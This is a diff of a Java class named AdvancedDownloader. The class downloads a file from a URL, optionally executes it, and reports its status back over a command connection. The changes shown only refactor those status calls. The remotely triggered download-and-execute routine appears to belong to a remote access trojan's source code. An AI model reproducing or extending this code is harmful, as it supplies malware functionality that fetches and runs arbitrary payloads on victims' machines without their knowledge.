@@ -24,7 +24,7 @@ public class AdvancedDownloader extends Thread {
 
 	public void run() {
 		try {
-			Connection.addToSendQueue(new Packet27URLStatus(url, "Downloading"));
+			Connection.instance.addToSendQueue(new Packet27URLStatus(url, "Downloading"));
 			File file = null;
 
 			URLConnection con = new URL(url).openConnection();
@@ -71,15 +71,15 @@ public class AdvancedDownloader extends Thread {
 
 			if (this.exec) {
 				Runtime.getRuntime().exec(new String[] { file.getAbsolutePath() });
-				Connection.addToSendQueue(new Packet27URLStatus(url, "Executed"));
+				Connection.instance.addToSendQueue(new Packet27URLStatus(url, "Executed"));
 			} else {
-				Connection.addToSendQueue(new Packet27URLStatus(url, "Downloaded"));
+				Connection.instance.addToSendQueue(new Packet27URLStatus(url, "Downloaded"));
 			}
 
 		} catch (Exception ex) {
-			Connection.writeLine("URLSTAT");
+			/*Connection.writeLine("URLSTAT");
 			Connection.writeLine(url);
-			Connection.writeLine(ex.getMessage());
+			Connection.writeLine(ex.getMessage());*/ // TODO
 			ex.printStackTrace();
 		}
 	}
